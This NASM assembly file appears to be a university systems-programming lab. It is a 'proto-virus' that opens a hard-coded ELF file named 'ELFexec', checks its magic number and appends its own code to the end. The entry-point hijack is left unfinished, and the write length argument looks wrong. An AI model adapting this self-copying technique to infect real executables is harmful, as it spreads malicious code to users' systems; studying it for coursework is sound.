%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

	; You code for this lab goes here
	call get_my_loc
	sub ecx, next_i-ThisIsVirus
	write 1, ecx, ThisIsVirusLen		;Print a message to stdout, something like "This is a virus". 

	open_file:
	call get_my_loc
	sub ecx, next_i-FileName
	mov ebx, ecx
	open ebx, RDWR, 0777		;Open an ELF file with a given constant name "ELFexec". The open mode should be RDWR

	;Check that the open succeeded
	get_fd:
	cmp eax,0				;get return value
	jl VirusErrorExit
	mov dword[ebp-4], eax 		; ebp-4 = fd

	;check that this is an ELF file using its magic number
	lea ebx, [ebp-8]		; ebp-8 = magic numbers
	read eax,ebx,4
	;that this is an ELF file

	check_elf:
	cmp byte[ebp-7],'E'
	jne VirusErrorExit
	cmp byte[ebp-6], 'L'
	jne VirusErrorExit
	cmp byte[ebp-5], 'F'
	jne VirusErrorExit
	
	;if we got here - this is ELF File
	lseek dword[ebp-4],0,SEEK_END		;lseek() to get to the end of the file
	mov dword[ebp-12] ,eax 			;returns a useful number: the number of bytes in the file.  epb-12 = filesize

	;Add the code of your virus at the end of the ELF file, 
	add_virus:
	write dword[ebp-4],_start,virus_end
	;and close the file
	close dword[ebp-4]
	
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)	
VirusErrorExit:
	call get_my_loc
	sub ecx, next_i-Failstr
	write 1, ecx, FailstrLength		;Print a message . 
    exit 1 

FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
FailstrLength: equ $-Failstr
ThisIsVirus: db "This is a Virus",10,0
ThisIsVirusLen: equ $-ThisIsVirus
PreviousEntryPoint: dd VirusExit

get_my_loc:
	call next_i
next_i:
    pop ecx
    ret
virus_end:


